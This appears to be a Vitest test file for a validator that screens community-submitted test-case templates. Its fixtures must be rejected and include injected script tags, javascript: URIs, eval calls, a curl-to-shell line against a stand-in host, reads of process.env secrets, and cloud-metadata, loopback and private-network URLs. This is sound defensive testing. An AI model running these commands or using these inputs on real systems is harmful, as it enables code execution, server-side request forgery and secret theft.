/** @vitest-environment node */
import { describe, expect, it } from "vitest";

import { validateTemplateContent } from "@/lib/community/validate";

function validCase(overrides: Record<string, unknown> = {}) {
  return {
    title: "Checkout with a valid card",
    objective: "Verify the happy-path checkout",
    preconditions: "User is signed in with items in the cart",
    steps: [{ action: "Open https://shop.example.com/checkout", expected: "Checkout form loads" }],
    expectedResults: "Order is placed and a confirmation is shown",
    priority: "high",
    coverage: "positive",
    testType: "functional",
    area: "Checkout",
    assumptions: [],
    ...overrides,
  };
}

function validContent(overrides: Record<string, unknown> = {}) {
  return { cases: [validCase()], ...overrides };
}

describe("validateTemplateContent — strict schema", () => {
  it("accepts well-formed content", () => {
    const res = validateTemplateContent(validContent());
    expect(res.ok).toBe(true);
  });

  it("rejects smuggled executable/host fields (unknown keys)", () => {
    for (const poisoned of [
      validContent({ script: "alert(1)" }),
      validContent({ allowedHosts: ["evil.example.com"] }),
      validContent({ cases: [validCase({ baseUrl: "http://169.254.169.254" })] }),
      validContent({
        cases: [validCase({ steps: [{ action: "x", expected: "y", code: "run()" }] })],
      }),
      validContent({ cases: [validCase({ eval: "1" })] }),
    ]) {
      const res = validateTemplateContent(poisoned);
      expect(res.ok).toBe(false);
    }
  });

  it("rejects empty and oversized case lists", () => {
    expect(validateTemplateContent({ cases: [] }).ok).toBe(false);
    expect(
      validateTemplateContent({ cases: Array.from({ length: 51 }, () => validCase()) }).ok,
    ).toBe(false);
  });
});

describe("validateTemplateContent — executable content scan", () => {
  it.each([
    ["javascript URI", { steps: [{ action: "Click javascript:alert(1)", expected: "x" }] }],
    ["script tag", { objective: "Inject <script>alert(1)</script> now" }],
    ["page.evaluate", { steps: [{ action: "Run page.evaluate(() => 1)", expected: "x" }] }],
    ["pipe to shell", { preconditions: "Run curl https://x.example.com | sh first" }],
    ["process.env", { objective: "Read process.env.SECRET and compare" }],
    ["eval call", { steps: [{ action: "Call eval(payload)", expected: "x" }] }],
  ])("rejects %s", (_label, caseOverrides) => {
    const res = validateTemplateContent(validContent({ cases: [validCase(caseOverrides)] }));
    expect(res.ok).toBe(false);
    if (!res.ok) expect(res.error).toMatch(/forbidden executable|Only http/);
  });
});

describe("validateTemplateContent — URL restrictions", () => {
  it.each([
    ["metadata host", "Open http://169.254.169.254/latest/meta-data"],
    ["loopback", "Open http://localhost:3000/admin"],
    ["127 loopback", "Open http://127.0.0.1/admin"],
    ["private 10.x", "Open http://10.0.0.5/internal"],
    ["private 192.168", "Open http://192.168.1.1/router"],
    ["private 172.16", "Open http://172.16.0.9/internal"],
    ["embedded credentials", "Open https://user:pass@shop.example.com/"],
    ["non-http scheme", "Open ftp://files.example.com/x"],
  ])("rejects %s URLs", (_label, action) => {
    const res = validateTemplateContent(
      validContent({ cases: [validCase({ steps: [{ action, expected: "x" }] })] }),
    );
    expect(res.ok).toBe(false);
  });

  it("allows ordinary public https URLs", () => {
    const res = validateTemplateContent(
      validContent({
        cases: [
          validCase({
            steps: [{ action: "Open https://shop.example.com/checkout", expected: "loads" }],
          }),
        ],
      }),
    );
    expect(res.ok).toBe(true);
  });
});
